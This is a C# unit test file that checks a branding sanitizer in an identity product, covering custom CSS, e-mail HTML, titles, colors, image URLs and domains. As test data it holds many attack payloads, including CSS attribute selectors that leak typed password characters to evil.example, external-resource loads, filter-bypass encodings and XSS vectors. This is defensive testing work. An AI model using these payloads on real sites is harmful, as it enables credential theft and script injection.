using IAM.Core.Security;

namespace IAM.Core.Tests;

/// <summary>
/// Task 5150: tenant branding is restricted to safe values. Custom CSS is an allow-list (no external resources, no
/// attribute selectors, no at-rules), e-mail HTML is reduced to an allow-list, titles are plain text, colors, image
/// URLs and the custom domain are checked. Includes the bypasses a reviewer would try (case, escapes, comments inside
/// tokens, nesting, markup break-out).
/// </summary>
public class BrandingSanitizerTests
{
    // ----- custom CSS: rejected ---------------------------------------------------------------

    [Theory]
    // the finding: leak each typed password character through attribute selectors + a background request
    [InlineData("input[type=password][value^=a]{background:url(https://evil.example/a)}")]
    [InlineData("input[value$='x']{color:red}")]
    [InlineData("#password[value*=\"p\"] { color: red }")]
    [InlineData("[type=password]{color:red}")]
    // external resources
    [InlineData("@import url(https://evil.example/x.css);")]
    [InlineData("@import 'https://evil.example/x.css';")]
    [InlineData("@IMPORT \"x.css\";")]
    [InlineData("@font-face{font-family:x;src:url(https://evil.example/f.woff)}")]
    [InlineData(".a{background:url(https://evil.example/x.png)}")]
    [InlineData(".a{background:URL(https://evil.example/x.png)}")]
    [InlineData(".a{background: url (x)}")]
    [InlineData(".a{background-image:image-set('x.png' 1x)}")]
    [InlineData(".a{background-image:-webkit-image-set(url(x.png) 1x)}")]
    [InlineData(".a{background:cross-fade(red,blue)}")]
    [InlineData(".a{list-style:image(x)}")]
    [InlineData(".a{width:expression(alert(1))}")]
    [InlineData(".a{behavior:url(x.htc)}")]
    [InlineData(".a{-moz-binding:url(x)}")]
    [InlineData(".a{color:javascript:alert(1)}")]
    // bypasses: comments inside tokens, escapes, case
    [InlineData(".a{background:u/**/rl(https://evil.example/x)}")]
    [InlineData(".a{background:ur/*x*/l(https://evil.example/x)}")]
    [InlineData(".a{background:\\75rl(https://evil.example/x)}")]
    [InlineData(".a{background:u\\72l(x)}")]
    [InlineData(".a{background:UrL(x)}")]
    [InlineData("@/**/import 'x';")]
    [InlineData(".a{color:red}/* unterminated")]
    // markup break-out, nesting, structure
    [InlineData("</style><script>alert(1)</script>")]
    [InlineData(".a{color:red}</style>")]
    [InlineData(".a{color:red} <b>")]
    [InlineData(".a{ .b{color:red} }")]
    [InlineData("@media print{.a{color:red}}")]
    [InlineData(".a{color:red")]
    [InlineData("color:red")]
    [InlineData("{color:red}")]
    [InlineData(".a{}x")]
    // properties and functions outside the allow-list
    [InlineData(".a{position:fixed;top:0;left:0}")]
    [InlineData(".a{content:'Enter your password again'}")]
    [InlineData(".a{display:none}")]
    [InlineData(".a{--x:1}")]
    [InlineData(".a{width:var(--x)}")]
    [InlineData(".a{background:attr(data-x)}")]
    [InlineData(".a{color:foo(1)}")]
    [InlineData(".a{color:red;;;font-family:x;behavior:y}")]
    [InlineData(".a:has(input){color:red}")]
    [InlineData(".a:not(.b){color:red}")]
    [InlineData("a\u0000b{color:red}")]
    public void ValidateCss_Rejects(string css)
    {
        var error = BrandingSanitizer.ValidateCss(css, out var normalized);

        Assert.False(string.IsNullOrEmpty(error), $"accepted: {css}");
        Assert.Equal(string.Empty, normalized);
        Assert.Null(BrandingSanitizer.SafeCssOrNull(css));
    }

    [Fact]
    public void ValidateCss_RejectsOverlongInput()
    {
        var css = string.Concat(Enumerable.Repeat(".a{color:red}", 3000));

        Assert.NotNull(BrandingSanitizer.ValidateCss(css, out _));
    }

    // ----- custom CSS: allowed ----------------------------------------------------------------

    [Theory]
    [InlineData(".login-card { background-color: #fff; border-radius: 12px; }")]
    [InlineData("body{font-family:'Open Sans', Arial, sans-serif;color:#333}")]
    [InlineData("h1, h2 { font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase }")]
    [InlineData(".btn:hover{background:#4F46E5;color:white!important}")]
    [InlineData("#hero > .title { margin: 0 auto; padding: 8px 16px; }")]
    [InlineData(".card{box-shadow:0 2px 8px rgba(0,0,0,.2)}")]
    [InlineData(".bg{background:linear-gradient(135deg, #4F46E5 0%, #7C3AED 100%)}")]
    [InlineData(".w{padding:calc(1rem + 2px)}")]
    [InlineData("input::placeholder{color:#999}")]
    [InlineData("/* brand */ .a{color:red} /* more */ .b{color:blue}")]
    public void ValidateCss_Accepts(string css)
    {
        var error = BrandingSanitizer.ValidateCss(css, out var normalized);

        Assert.Null(error);
        Assert.False(string.IsNullOrWhiteSpace(normalized));
        Assert.DoesNotContain("/*", normalized);
        Assert.Equal(normalized, BrandingSanitizer.SafeCssOrNull(css));
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("/* only a comment */")]
    public void ValidateCss_EmptyIsFine(string? css)
    {
        Assert.Null(BrandingSanitizer.ValidateCss(css, out var normalized));
        Assert.Equal(string.Empty, normalized);
    }

    // ----- e-mail HTML ------------------------------------------------------------------------

    [Theory]
    [InlineData("<script>alert(1)</script>", "alert")]
    [InlineData("<SCRIPT SRC=//evil.example/x.js></SCRIPT>", "evil")]
    [InlineData("<scr<script>ipt>alert(1)</scr</script>ipt>", "alert(1)<")]
    [InlineData("<img src=\"https://x.example/a.png\" onerror=\"alert(1)\">", "onerror")]
    [InlineData("<img src=x onerror=alert(1)>", "onerror")]
    [InlineData("<p onclick=\"alert(1)\">hi</p>", "onclick")]
    [InlineData("<a href=\"javascript:alert(1)\">x</a>", "javascript")]
    [InlineData("<a href=\"JaVaScRiPt:alert(1)\">x</a>", "script:")]
    [InlineData("<a href=\"&#106;avascript:alert(1)\">x</a>", "avascript")]
    [InlineData("<a href=\"java\tscript:alert(1)\">x</a>", "script:")]
    [InlineData("<a href=\"  javascript:alert(1)\">x</a>", "javascript")]
    [InlineData("<a href=\"vbscript:x\">x</a>", "vbscript")]
    [InlineData("<a href=\"data:text/html;base64,PHNjcmlwdD4=\">x</a>", "data:")]
    [InlineData("<img src=\"data:image/svg+xml;base64,AAA\">", "data:")]
    [InlineData("<iframe src=\"https://evil.example\"></iframe>", "iframe")]
    [InlineData("<object data=\"x\"></object><embed src=\"x\">", "embed")]
    [InlineData("<svg onload=alert(1)><circle/></svg>", "svg")]
    [InlineData("<form action=\"https://evil.example\"><input name=p></form>", "form")]
    [InlineData("<link rel=\"stylesheet\" href=\"https://evil.example/x.css\">", "stylesheet")]
    [InlineData("<style>@import url(https://evil.example/x.css);</style>", "import")]
    [InlineData("<style>body{background:url(x)}</style>", "background")]
    [InlineData("<div style=\"background:url(https://evil.example/x)\">x</div>", "url(")]
    [InlineData("<div style=\"width:expression(alert(1))\">x</div>", "expression")]
    [InlineData("<div style=\"position:fixed;top:0\">x</div>", "fixed")]
    [InlineData("<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">", "refresh")]
    [InlineData("<base href=\"https://evil.example/\">", "base")]
    [InlineData("<!-- <script>alert(1)</script> -->", "script")]
    [InlineData("<!DOCTYPE html><html><body>x</body></html>", "DOCTYPE")]
    [InlineData("<math><mi xlink:href=\"javascript:alert(1)\">x</mi></math>", "javascript")]
    public void SanitizeEmailHtml_RemovesTheDangerousPart(string html, string mustNotRemain)
    {
        var result = BrandingSanitizer.SanitizeEmailHtml(html) ?? string.Empty;

        Assert.DoesNotContain(mustNotRemain, result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<script", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain(" on", result, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void SanitizeEmailHtml_KeepsSafeMarkup()
    {
        var html = "<table width=\"100%\"><tr><td style=\"color:#333;padding:8px\"><a href=\"https://acme.example/home\" target=\"_blank\">Acme</a>"
                   + " <img src=\"https://acme.example/logo.png\" alt=\"Acme\" width=\"120\"><br><b>Hello</b> <i>there</i></td></tr></table>";

        var result = BrandingSanitizer.SanitizeEmailHtml(html)!;

        Assert.Contains("<table", result);
        Assert.Contains("href=\"https://acme.example/home\"", result);
        Assert.Contains("rel=\"noopener noreferrer\"", result);
        Assert.Contains("src=\"https://acme.example/logo.png\"", result);
        Assert.Contains("style=\"color:#333;padding:8px\"", result);
        Assert.Contains("<b>Hello</b>", result);
        Assert.Contains("</table>", result);
    }

    [Fact]
    public void SanitizeEmailHtml_AllowsMailtoLinks_AndClosesUnclosedTags()
    {
        var result = BrandingSanitizer.SanitizeEmailHtml("<div><a href=\"mailto:help@acme.example\">Mail us")!;

        Assert.Contains("href=\"mailto:help@acme.example\"", result);
        Assert.EndsWith("</a></div>", result);
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("<script>x</script>")]
    [InlineData("<!-- nothing -->")]
    public void SanitizeEmailHtml_NothingLeft_IsNull(string? html)
    {
        Assert.Null(BrandingSanitizer.SanitizeEmailHtml(html));
    }

    [Fact]
    public void SanitizeEmailHtml_StrayAngleBracketsAreEncoded()
    {
        var result = BrandingSanitizer.SanitizeEmailHtml("1 < 2 and 3 > 2")!;

        Assert.DoesNotContain("<", result);
        Assert.Contains("&lt;", result);
    }

    // ----- plain values -----------------------------------------------------------------------

    [Theory]
    [InlineData("Welcome to Acme")]
    [InlineData("Sign in & get going")]
    [InlineData("")]
    [InlineData(null)]
    public void ValidatePlainText_AcceptsText(string? text) =>
        Assert.Null(BrandingSanitizer.ValidatePlainText(text, "Login title", BrandingSanitizer.MaxTitleLength));

    [Theory]
    [InlineData("<b>Welcome</b>")]
    [InlineData("Hi <script>alert(1)</script>")]
    [InlineData("a > b")]
    [InlineData("line\u0001break")]
    public void ValidatePlainText_RejectsMarkup(string text) =>
        Assert.NotNull(BrandingSanitizer.ValidatePlainText(text, "Login title", BrandingSanitizer.MaxTitleLength));

    [Fact]
    public void ValidatePlainText_RejectsOverlong() =>
        Assert.NotNull(BrandingSanitizer.ValidatePlainText(new string('a', 121), "Login title", BrandingSanitizer.MaxTitleLength));

    [Theory]
    [InlineData("<b>Hi</b> there", "Hi there")]
    [InlineData("<script>alert(1)</script>x", "alert(1)x")]
    [InlineData("<img src=x onerror=alert(1)", "")]
    public void StripToPlainText_RemovesTags(string input, string expected) =>
        Assert.Equal(string.IsNullOrEmpty(expected) ? null : expected, BrandingSanitizer.StripToPlainText(input, 100));

    [Theory]
    [InlineData("#4F46E5")]
    [InlineData("#fff")]
    [InlineData("#11223344")]
    [InlineData(null)]
    [InlineData("")]
    public void ValidateColor_AcceptsHex(string? color) => Assert.Null(BrandingSanitizer.ValidateColor(color, "Primary color"));

    [Theory]
    [InlineData("red")]
    [InlineData("#12")]
    [InlineData("#4F46E5; background: url(x)")]
    [InlineData("rgb(0,0,0)")]
    [InlineData("#gggggg")]
    public void ValidateColor_RejectsEverythingElse(string color) => Assert.NotNull(BrandingSanitizer.ValidateColor(color, "Primary color"));

    [Theory]
    [InlineData("https://cdn.acme.example/logo.png")]
    [InlineData("http://cdn.acme.example/a.png?x=1")]
    [InlineData("/assets/logo.svg")]
    [InlineData(null)]
    public void ValidateImageUrl_Accepts(string? url) => Assert.Null(BrandingSanitizer.ValidateImageUrl(url, "Logo URL"));

    [Theory]
    [InlineData("javascript:alert(1)")]
    [InlineData("data:image/svg+xml;base64,AAA")]
    [InlineData("//evil.example/x.png")]
    [InlineData("https://x.example/a.png');background:url(https://evil.example/y")]
    [InlineData("https://x.example/a b.png")]
    [InlineData("https://user:pw@x.example/a.png")]
    [InlineData("ftp://x.example/a.png")]
    [InlineData("https://x.example/\"onerror=\"x")]
    [InlineData("logo.png")]
    public void ValidateImageUrl_Rejects(string url)
    {
        Assert.NotNull(BrandingSanitizer.ValidateImageUrl(url, "Logo URL"));
        Assert.Null(BrandingSanitizer.SafeImageUrlOrNull(url));
    }

    // ----- custom domain ----------------------------------------------------------------------

    [Theory]
    [InlineData("login.acme.com", "login.acme.com")]
    [InlineData("  Login.ACME.com. ", "login.acme.com")]
    [InlineData("sso.eu.acme.co.uk", "sso.eu.acme.co.uk")]
    public void NormalizeDomain_AcceptsHostNames(string input, string expected) =>
        Assert.Equal(expected, BrandingSanitizer.NormalizeDomain(input));

    [Theory]
    [InlineData("https://login.acme.com")]
    [InlineData("login.acme.com:8443")]
    [InlineData("login.acme.com/path")]
    [InlineData("localhost")]
    [InlineData("127.0.0.1")]
    [InlineData("10.0.0.1")]
    [InlineData("acme")]
    [InlineData("-bad.acme.com")]
    [InlineData("a b.acme.com")]
    [InlineData("login.acme.com@evil.example")]
    [InlineData("bücher.example")]
    [InlineData("")]
    [InlineData(null)]
    public void NormalizeDomain_RejectsEverythingElse(string? input) => Assert.Null(BrandingSanitizer.NormalizeDomain(input));
}
